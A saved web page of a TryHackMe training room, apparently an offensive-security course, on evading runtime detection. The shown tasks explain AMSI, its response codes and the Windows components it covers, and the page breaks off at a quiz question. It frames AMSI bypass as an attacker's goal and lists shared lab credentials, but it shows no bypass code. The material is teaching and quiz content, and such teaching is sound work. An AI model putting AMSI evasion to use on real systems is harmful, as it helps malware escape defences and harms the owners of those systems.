<div id="nav-notifications">
<div class="text-center mt-2 mb-2"><i>Loading..</i></div>
</div>
</div>
</li>
<li class="nav-item dropdown">
<a class="nav-link dropdown-toggle remove-arrow p-0" href="https://tryhackme.com/room/runtimedetectionevasion#" id="navbarAvatarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
<img src="./TryHackMe _ Runtime Detection Evasion_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
</a>
<div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarAvatarDropdown">
<a class="dropdown-item" href="https://tryhackme.com/profile">Profile</a>
<a class="dropdown-item" href="https://tryhackme.com/referrals">Refer a friend</a>
<a class="dropdown-item" href="https://tryhackme.com/badges">Badges</a>
<a class="dropdown-item" href="https://tryhackme.com/rooms">My Rooms</a>
<a class="dropdown-item" href="https://tryhackme.com/access">Access</a>
<a class="dropdown-item" href="https://tryhackme.com/feedback">Give Feedback</a>
<a class="dropdown-item" href="https://tryhackme.com/logout">Logout</a>
</div>
</li>

</ul>
</div>
</div>
</nav>
<link rel="stylesheet" href="./TryHackMe _ Runtime Detection Evasion_files/streak-freeze.css">
<div class="modal fade modal-streak-freeze" id="unlocked-streak-freeze" role="dialog">
<div class="modal-dialog" role="document">
<div class="modal-content">
<button type="button" class="close close-streak" id="close-streak-freeze-popup" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
<div class="modal-body">
<figure>
<img class="img-streak" width="400px" alt="streak freeze unlocked" src="./TryHackMe _ Runtime Detection Evasion_files/streak-freeze.svg">
</figure>
<h2>You've unlocked a streak freeze!</h2>
<p>With these one-time streak freezes, you can miss one day of hacking without losing your streak.</p>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Runtime Detection Evasion_files/streak-freeze.js"></script>
<nav id="thm-mobile-nav-menu" class="thm-mobile-nav" aria-label="Mobile secondary navigation menu.">
<header>
<a href="https://tryhackme.com/" aria-label="Go to the home page">
<img width="140" src="./TryHackMe _ Runtime Detection Evasion_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
</a>
<button id="thm-mobile-nav-close" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Close mobile navigation">
<i class="fal fa-times"></i>
</button>
</header>
<ul class="thm-mobile-nav-items mb-0">
<li class="nav-item ">
<a class="nav-link" href="https://tryhackme.com/dashboard">
<i class="nav-title-icon far fa-browser"></i>
<div class="nav-title">Dashboard</div>
</a>
</li>
<li class="nav-item active">
<a class="nav-link" href="https://tryhackme.com/hacktivities">
<i class="nav-title-icon far fa-book-open"></i>
<div class="nav-title">Learn</div>
</a>
</li>
<li class="nav-item ">
<a aria-expanded="false" aria-controls="mobile-nav-compete" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-compete" class="sublinks-toggle nav-link">
<i class="nav-title-icon far fa-trophy"></i>
<div class="nav-title">Compete</div>
<i class="far fa-angle-down"></i>
</a>
<div id="mobile-nav-compete" class="dropdown-wrapper">
<a href="https://tryhackme.com/leaderboards">
<div>
<i class="fas fa-trophy"></i>
</div>
<div>
<span class="mb-0">Leaderboards</span>
<div class="text-lgray size-12">Platform Rankings</div>
</div>
</a>
<a href="https://tryhackme.com/games/koth">
<div>
<i class="fas fa-crown"></i>
</div>
<div>
<span class="mb-0">King of the Hill</span>
<div class="text-lgray size-12">Attack &amp; Defend</div>
</div>
</a>
<a href="https://tryhackme.com/workspace">
<div>
<i class="fas fa-user-friends"></i>
</div>
<div>
<span class="mb-0">Workspace</span>
<div class="text-lgray size-12">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item">
<a aria-expanded="false" aria-controls="mobile-nav-other" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-other" class="sublinks-toggle nav-link">
<i class="nav-title-icon far fa-ellipsis-h-alt"></i>
<div class="nav-title">Other</div>
<i class="far fa-angle-down"></i>
</a>
<div id="mobile-nav-other" class="dropdown-wrapper">
<a href="https://tryhackme.com/resources">Resources</a>
<a href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
<a href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
<a href="https://tryhackme.com/business">For Business</a>
<a href="https://tryhackme.com/classrooms">For Education</a>
<a target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
</div>
</li>
<li class="nav-item text-center">
<div class="nav-item-streak">
<span id="mobile-streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;

&lt;div class=&#39;size-12 faded&#39;&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Access to networks, Streak freeze&lt;/p&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Streak freeze&lt;/p&gt;
  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
&lt;/div&gt;
 &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="">
<span id="mobile-user-streak" data-streak="7" class="hacker-green">7 <i class="fas fa-fire-alt"></i></span>
</span>
</div>
</li>
<li class="nav-item text-center">
<a class="nav-link size-22 d-inline-block" href="https://tryhackme.com/room/runtimedetectionevasion#" id="mobile-notification-btn" role="button" data-toggle="dropdown">
<i id="mobile-notification-icon" class="fal fa-bell"></i>
<div id="mobile-notification-dot"></div>
</a>
<div id="mobile-nav-notification" class="dropdown-menu dropdown-menu-right">
<div id="mobile-notification-header">Notifications</div>
<div id="mobile-nav-notifications">
<div class="text-center mt-2 mb-2"><i>Loading..</i></div>
</div>
</div>
</li>
<li class="nav-item text-center">
<a aria-expanded="false" aria-controls="mobile-nav-auth" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-auth" class="sublinks-toggle nav-link d-inline-block">
<img src="./TryHackMe _ Runtime Detection Evasion_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
</a>
<div id="mobile-nav-auth" class="dropdown-wrapper">
<a href="https://tryhackme.com/profile">Profile</a>
<a href="https://tryhackme.com/referrals">Refer a friend</a>
<a href="https://tryhackme.com/badges">Badges</a>
<a href="https://tryhackme.com/rooms">My Rooms</a>
<a href="https://tryhackme.com/access">Access</a>
<a href="https://tryhackme.com/feedback">Give Feedback</a>
<a href="https://tryhackme.com/logout">Logout</a>
</div>
</li>
</ul>
</nav>
<script defer="" src="./TryHackMe _ Runtime Detection Evasion_files/mobile-nav.js"></script>
<script>
  const userSignedUpLessThanSevenDaysAgo = Math.floor(
    (new Date() - new Date('Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)')) / (1000 * 60 * 60 * 24) < 7
  );

  const userHasFirst4RoomsBadge = !!``;
  const isBeginner = `advanced` === 'complete-beginner';
</script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/notifications.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/streak-freeze(1).js"></script>
<div id="wrapper">
<div id="room-banner" class="shadow-light">
<img id="room-image-large" src="./TryHackMe _ Runtime Detection Evasion_files/461db271e310812a73d4a96abd2dc9eb.png">
<div>
<div id="room-details" class="">
<div class="container">
<div class="page-header">
<div class="room-header">
<div id="room-voting" class="text-center vertical-align-custom">
<div class="voting-buttons">
<i class="fas fa-thumbs-up display-block" onclick="makeVote(true)" id="vote-up" style="color: rgb(185, 185, 185);"></i>
<div class="display-block" id="vote-number">197</div>
<i class="fas fa-thumbs-down display-block" onclick="makeVote(false)" id="vote-down" style="color: rgb(185, 185, 185);"></i>
</div>
</div>
<div id="room-logo" class="vertical-align-custom">
<div id="logo"><img class="room-avatar" src="./TryHackMe _ Runtime Detection Evasion_files/f15baa9526326b2c25365dafbe8d1767.png" onerror="replaceImg(this)"></div>
</div>
<div class="vertical-align-custom">
<div id="room-basic-data">
<div class="d-flex justify-content-between">
<h1 id="title" class="bold-head">Runtime Detection Evasion</h1>
<div id="room-title-options">

<div class="btn-group" id="browser-machine-options" role="group" aria-label="Start AttackBox or Kali Linux" style="display: inline-flex;">
<button id="browser-machine-start" type="button" class="btn btn-secondary"><i class="far fa-laptop"></i> Start AttackBox</button>
<div class="btn-group" id="browser-machines" role="group">
<button id="btnGroupDrop1" type="button" class="btn btn-secondary dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></button>
<div class="dropdown-menu" aria-labelledby="btnGroupDrop1">
<a class="dropdown-item  preventDefault" href="https://tryhackme.com/room/runtimedetectionevasion#" onclick="changeMyMachine(&quot;kali-linux&quot;)">
<span class="mb-0">Use Kali Linux</span>
<div class="text-lgray size-12">Web-based Kali Machine</div>
</a>
<a class="dropdown-item preventDefault" href="https://tryhackme.com/room/runtimedetectionevasion#" onclick="changeMyMachine(&quot;attackbox&quot;)">
<span class="mb-0">Use AttackBox</span>
<div class="text-lgray size-12">Recommended</div>
</a>
</div>
</div>
</div>
<button id="browser-machine-split-view" type="button" class="btn btn-secondary" style="display: none;">Show Split View</button>
<button id="cloud-details" type="button" class="btn btn-info"><i class="far fa-clouds mr-1"></i>Cloud Details</button>
<span id="awards-model-btn" data-toggle="modal" data-target="#award-modal" class="badge badge-warning ml-1 noselect">Awards</span>
<span id="room-faq-slideout" type="button" class="badge badge-info ml-1 noselect d-inline-flex" onclick="openHelpMenu()">
Help
</span>
<div class="dropright room-dropright noselect ml-1" id="room-options" style="display: inline-block;">
<span class="badge badge-secondary" data-toggle="dropdown">
<i class="fas fa-cog"></i>
</span>
<div class="dropdown-menu">
<a class="dropdown-item" href="https://tryhackme.com/api/room/manage/clone/runtimedetectionevasion" id="clone-room" style="display: none;"><i class="far fa-clone faded"></i> Clone Room</a>
<a class="dropdown-item preventDefault" id="writeups-simple" style="display: inline-block;"><i class="fas fa-pen-alt faded"></i> Writeups</a>
<a class="dropdown-item preventDefault" data-toggle="modal" data-target="#resetUserProgressModal"><i class="fas fa-eraser faded"></i> Reset Progress</a>
<a class="dropdown-item preventDefault" id="leave-room"><i class="fas fa-sign-out-alt faded"></i> Leave</a>
</div>
</div>
<span id="bookmark" class="badge badge-secondary badge-bookmark ">
<img class="bookmark" src="./TryHackMe _ Runtime Detection Evasion_files/bookmark.svg">
<span class="bookmark-popover" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="top" data-content="&lt;p class=&#39;mb-0&#39;&gt;Save room &lt;/p&gt;
" data-original-title="" title="">
</span>
</span>
</div>
</div>
<p class="mb0 faded" id="description">Learn how to bypass common runtime detection measures, such as AMSI, using modern tool-agnostic approaches.</p>
</div>
</div>
</div>
</div>

</div>
</div>
<div id="room-banner-stats">
<div class="creators"></div>
<div class="numbers"></div>
</div>
</div>
</div>
<div class="container main pb">
<div id="room-message"></div>
<section id="sponsor">
<i id="sponsor-close" class="fas fa-times"></i>
<div id="sponsor-data"></div>
</section>
<div id="top-panel">
<ul class="nav nav-tabs" id="task-navs">
<li class="nav-item">
<a class="nav-link  active " data-toggle="tab" href="https://tryhackme.com/room/runtimedetectionevasion#chart">
<i class="fas fa-chart-line icon-right"></i> Chart
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/runtimedetectionevasion#scoreboard">
<i class="fas fa-trophy icon-right"></i> Scoreboard
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/runtimedetectionevasion#chat">
<i class="fas fa-comments-alt icon-right chat-icon"></i> Discuss
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/runtimedetectionevasion#writeups">
<i class="fas fa-pen-alt icon-right"></i> Writeups
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/runtimedetectionevasion#about">
<i class="fas fa-info-circle icon-right"></i> More
</a>
</li>
</ul>
<div class="card cd-2 nav-above-con" id="room-main">
<div class="card-body">
<span id="room-tabs">
<div class="tab-content">
<div id="chart" class="tab-pane  active ">
<span id="difficulty-bar">
    <span class="room-difficulty diff-text">
      Difficulty: 
        <span class="difficulty-hard">Hard</span>
    </span></span>
<br><div id="chart-data"></div>
</div>
<div id="scoreboard" class="tab-pane fade">
<table class="table table-striped table-bordered table-condensed table-header-rotated mb-0" id="scoreboard_table">
<thead>
<tr id="scoreboard_header">
<th>Rank</th>
<th>Username</th>
<th>Total Score</th>
</tr>
</thead>
<tbody id="scoreboard_body"></tbody>
</table>
</div>
<div id="chat" class="tab-pane fade">

<div class="row">
<div class="col-sm-6 text-center">
<h3 class="mb-2">Discord</h3>
<p>Come join our <a target="_blank" href="https://discord.gg/QgC6Tdk">Discord</a> server for support or further discussions</p>
</div>
<div class="col-sm-6 text-center">
<h3 class="mb-2">Forum</h3>
<div id="forum-text">Read or post on the dedicated forum <a href="https://tryhackme.com/forum/thread/6232518c0d40d20043b26bd0">post</a></div>
</div>
</div>
</div>
<div id="writeups" class="tab-pane text-center">
<div id="writeups-data">There are no writeups submitted.</div>
<button onclick="showWriteupForm(this)" type="button" class="btn btn-xs btn-secondary mt-3 mb-2">Add Writeup</button>
<div id="writeup-form">
<div class="form-row">
<div class="col-auto">
<input type="text" class="form-control mb-2" id="writeup-title" placeholder="Writeup Title">
</div>
<div class="col-auto">
<input type="text" class="form-control mb-2" id="writeup-link" placeholder="Writeup URL">
</div>
<div class="col-auto">
<button id="submit-writeup" type="submit" class="btn btn-success mb-2">Submit</button>
</div>
</div>
<p class="faded mb-0 size-14"><i class="fas fa-exclamation-triangle text-warning"></i> Writeups should have a link to TryHackMe and not include any passwords/cracked hashes/flags</p>
</div>
</div>
<div id="about" class="tab-pane text-center">
<p id="about-freeRoom"><p class="mb-0">Only subscribers can deploy virtual machines in this room! 
        Go to your <a href="https://tryhackme.com/profile">profile</a> page to subscribe (if you have not already). 4685 users are in here and this room is 486 days old.</p></p>
<p id="about-owner"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Runtime Detection Evasion_files/af7feb2c43a2c7d5f111b98ccbd15048.png"> 
        <a class="green-link" href="https://tryhackme.com/p/tryhackme">tryhackme</a> and <img class="avatar-tiny" src="./TryHackMe _ Runtime Detection Evasion_files/9e946af210ae86d6fbfda480d958b3fe.gif"> 
        <a class="green-link" href="https://tryhackme.com/p/Cryillic">Cryillic</a></p></p>
</div>
</div>
</span>
</div>
</div>
</div>
<div id="room-simple-video" class="card card-body cd-2"></div>
<div class="card mt-3 mb-3 cd-2 text-center" id="instance-info" style="display: none;">
<div class="card-header card-header-red">Active Machine Information</div>
<div class="card-body">
<div class="row vertical-align-custom">
<div class="col-sm-3"><div class="bold">Title</div>Runtime Sandbox</div>
<div class="col-sm-3" id="table-machine-ip">
    <div class="bold">IP Address</div>
    <span id="machine-ip">MACHINE_IP</span>
    <i onclick="copyMachineIP()" id="copy-machine-ip" class="fal fa-copy faded hover-pointer size-14" data-toggle="tooltip" title="Copy to clipboard" style="display: none;"></i></div>
<div class="col-sm-3"><div class="bold">Expires</div><span id="expires">1h 06m 37s</span></div>
<div class="col-sm-3">
    <button type="button" class="btn btn-secondary deployment-info" onclick="$(&#39;#roomStartAttackboxModal&#39;).modal(&#39;toggle&#39;)">
        <i class="fas fa-question"></i>
    </button>
    <button class="btn btn-warning deployment-info" onclick="extendVM(&#39;i-08801b2ac1d899b07&#39;)" id="add-vm-time" value="runtimedetectionevasion">
        Add 1 hour
    </button>
    <button type="button" class="btn btn-danger deployment-info" id="terminate-vm" onclick="terminateVM(&#39;i-08801b2ac1d899b07&#39;)">
        Terminate
    </button></div>
</div>
</div>
</div>
<div id="task-list">
<div id="room-task-detail" class="mb-3"><span id="progress-bar" style="display: block;"><div class="progress"><div class="progress-bar bg-success" role="progressbar" style="width: 100%; aria-valuemin=" 0"="" aria-valuemax="100"> 100%</div></div></span></div>
<div id="taskContent"><div class="card" id="task-1">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse1" aria-expanded="true">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 1                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Introduction
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"><i class="far fa-server text-lgreen" data-toggle="tooltip" data-placement="left" title="" data-original-title="Task includes a deployable machine"></i></span>
                        </a>
                    </div>
                    <div id="collapse1" class="collapse show" data-parent="#taskContent" style="">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"><div class="btn-group mb-3 ml-3 float-right">
            <button type="button" class="btn btn-success" value="620bdee809bdbb005b8b8af4" onclick="deploy(this)"><i class="fas fa-play mr-2"></i> Start Machine</button>
        </div> <p><span>With the release of <a class="Pr25SKLB glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;Pr25SKLB&#39;)">PowerShell</a> &lt;3 the Blue Team, Microsoft released AMSI (Anti-Malware Scan Interface), a runtime monitoring solution designed to stop and monitor ongoing threats.</span></p>
<div>
<img src="./TryHackMe _ Runtime Detection Evasion_files/3cd5f36d0e880e6ec0f312c1cd52519d.png" style="float:right;width:237px;height:267.042px" class="note-float-right"><p><span style="font-size:24px">Learning Objectives</span></p><ul><li>Understand the purpose of runtime detections and how they are instrumented.</li><li>Learn and apply techniques to bypass AMSI.</li><li>Understand common mitigations and potential alternatives to techniques.</li>
</ul>
</div>
<p>Runtime detection measures can cause many headaches and roadblocks when executing malicious code. Luckily for us as attackers, there are several techniques and methods we can abuse and leverage to bypass common runtime detection solutions.</p><p>This room will use research from several authors and researchers; all credit goes to the respective owners.</p><p><span>Before beginning this room, familiarize yourself with operating system architecture as a whole. Basic programming knowledge in C# and <a class="mlNvZRIx glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;mlNvZRIx&#39;)">PowerShell</a> is also recommended but not required.</span></p><p><span>We have provided a base Windows machine with the files needed to complete this room. You can access the machine in-browser or through <a class="4VE2IVhQ glossary-term" onclick="initPopOver(&#39;RDP&#39;, &#39;4VE2IVhQ&#39;)">RDP</a> using the credentials below.</span></p><p style="text-align:center">Machine IP:&nbsp;<code style="font-size:14px">MACHINE_IP</code><span style="font-size:1rem">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Username:&nbsp;</span><code style="font-size:14px">THM-Attacker</code><span style="font-size:1rem">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span style="font-size:1rem">Password:&nbsp;</span><code style="font-size:14px">Tryhackme!</code></p><p>


</p><p>This is going to be a lot of information. Please buckle your seatbelts and locate your nearest fire extinguisher.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Start the provided machine and move on to the next tasks.
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="1">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" onclick="answerQuestion(this, &#39;undefined&#39;)" disabled="">Correct Answer</button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-2">
                    <div class="card-header task-header collapsed" data-toggle="collapse" href="#collapse2" aria-expanded="false">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 2                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Runtime Detections
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse2" class="collapse show" data-parent="#taskContent" style="">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><span style="background:transparent;font-size:1rem;color:rgb(14, 16, 26);margin-top:0pt;margin-bottom:0pt">When executing code or applications, it will almost always flow through a runtime, no matter the interpreter. This is most commonly seen when using Windows API calls and interacting with .NET. The&nbsp;</span><a target="_blank" href="https://docs.microsoft.com/en-us/dotnet/standard/clr" class="editor-rtfLink"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">CLR (</span><strong><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">C</span></strong><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">ommon&nbsp;</span><strong><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">L</span></strong><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">anguage&nbsp;</span><strong><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">R</span></strong><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">untime)</span></a><span style="background:transparent;font-size:1rem;color:rgb(14, 16, 26);margin-top:0pt;margin-bottom:0pt">&nbsp;and&nbsp;</span><a target="_blank" href="https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/dynamic-language-runtime-overview" class="editor-rtfLink"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">DLR (</span><strong><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">D</span></strong><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">ynamic&nbsp;</span><strong><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">L</span></strong><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">anguage&nbsp;</span><strong><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">R</span></strong><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">untime)</span></a><span style="background:transparent;font-size:1rem;color:rgb(14, 16, 26);margin-top:0pt;margin-bottom:0pt">&nbsp;are the runtimes for .NET and are the most common you will encounter when working with Windows systems. In this task, we will not discuss the specifics of runtimes; instead, we will discuss how they are monitored and malicious code is detected.</span><br></p>


<div>
<img src="./TryHackMe _ Runtime Detection Evasion_files/661f531c5ed672964a654d56fe28edb9.png" style="float:right;width:256px;height:288.451px" class="note-float-right">



<p>A runtime detection measure will scan code before execution in the runtime and determine if it is malicious or not. Depending on the detection measure and technology behind it, this detection could be based on string signatures, heuristics, or behaviors. If code is suspected of being malicious, it will be assigned a value, and if within a specified range, it will stop execution and possibly quarantine or delete the file/code.</p><p>Runtime detection measures are different from a standard anti-virus because they will scan directly from memory and the runtime. At the same time, anti-virus products can also employ these runtime detections to give more insight into the calls and hooks originating from code. In some cases, anti-virus products may use a runtime detection stream/feed as part of their heuristics.</p><p>
</p></div>

<p></p><p><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">We will primarily focus on&nbsp;</span><a target="_blank" href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal" class="editor-rtfLink"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">AMSI(</span><strong><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">A</span></strong><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">nti-</span><strong><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">M</span></strong><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">alware&nbsp;</span><strong><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">S</span></strong><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">can&nbsp;</span><strong><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">I</span></strong><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">nterface)</span></a><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">&nbsp;in this room. AMSI is a runtime detection measure shipped natively with Windows and is an interface for other products and solutions.</span><br></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Read the above and answer the question below.
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" onclick="answerQuestion(this, &#39;undefined&#39;)" disabled="">Correct Answer</button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>What runtime detection measure is shipped natively with Windows?<br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ****" value="" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" onclick="answerQuestion(this, &#39;undefined&#39;)" disabled="">Correct Answer</button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-3">
                    <div class="card-header task-header collapsed" data-toggle="collapse" href="#collapse3" aria-expanded="false">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 3                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> AMSI Overview
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse3" class="collapse show" data-parent="#taskContent" style="">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>AMSI (<strong>A</strong>nti-<strong>M</strong>alware&nbsp;<strong>S</strong>can&nbsp;<strong>I</strong><span>nterface) is a <a class="bcNRq1eT glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;bcNRq1eT&#39;)">PowerShell</a> security feature that will allow any applications or services to integrate directly into anti-malware products. Defender instruments AMSI to scan payloads and scripts before execution inside the .NET runtime. From Microsoft: "The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows your applications and services to integrate with any anti-malware product that's present on a machine. AMSI provides enhanced malware protection for your end-users and their data, applications, and workloads."</span></p>
<p>For more information about AMSI, check out the&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/amsi/">Windows docs</a>.</p>
<div>
<p>AMSI will determine its actions from a response code as a result of monitoring and scanning. Below is a list of possible response codes,</p>

<img src="./TryHackMe _ Runtime Detection Evasion_files/8a5a7c3e04fb1ccf3e5391ce397c50a6.png" style="float:right;width:176.696px;height:199.094px" class="note-float-right">
<ul>
<li>AMSI_RESULT_CLEAN = 0</li>
<li>AMSI_RESULT_NOT_DETECTED = 1</li>
<li>AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384</li>
<li>AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479</li>
<li>AMSI_RESULT_DETECTED = 32768</li>
</ul>
</div>
<p>These response codes will only be reported on the backend of AMSI or through third-party implementation. If AMSI detects a malicious result, it will halt execution and send the below error message.<br></p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            AMSI Error Response
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token output">PS C:Users\Tryhackme&gt; 'Invoke-Hacks'
At line:1 char:1
+ "Invoke-Hacks"
+ ~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
		+ CategoryInfo          : ParserError: (:) []. ParentContainsErrorRecordException
		+ FullyQualifiedErrorId : ScriptContainedMaliciousContent</span></code></pre></div></div>
<p>AMSI is fully integrated into the following Windows components,</p><ul>
<li><span>User Account Control, or <a class="CNeHg8Lj glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;CNeHg8Lj&#39;)">UAC</a></span></li>
<li><span><a class="SbW88F40 glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;SbW88F40&#39;)">PowerShell</a></span></li>
<li>Windows Script Host (wscript and cscript)</li>
<li>JavaScript and VBScript</li>
<li>Office VBA macros</li>
</ul><p>As attackers, when targeting the above components, we will need to be mindful of AMSI and its implementations when executing code or abusing components.</p><p>


</p><p>In the next task, we will cover the technical details behind how AMSI works and is instrumented in Windows.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Read the above and answer the question below.
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" onclick="answerQuestion(this, &#39;undefined&#39;)" disabled="">Correct Answer</button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                What response value is assigned to <code>32768</code>?
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
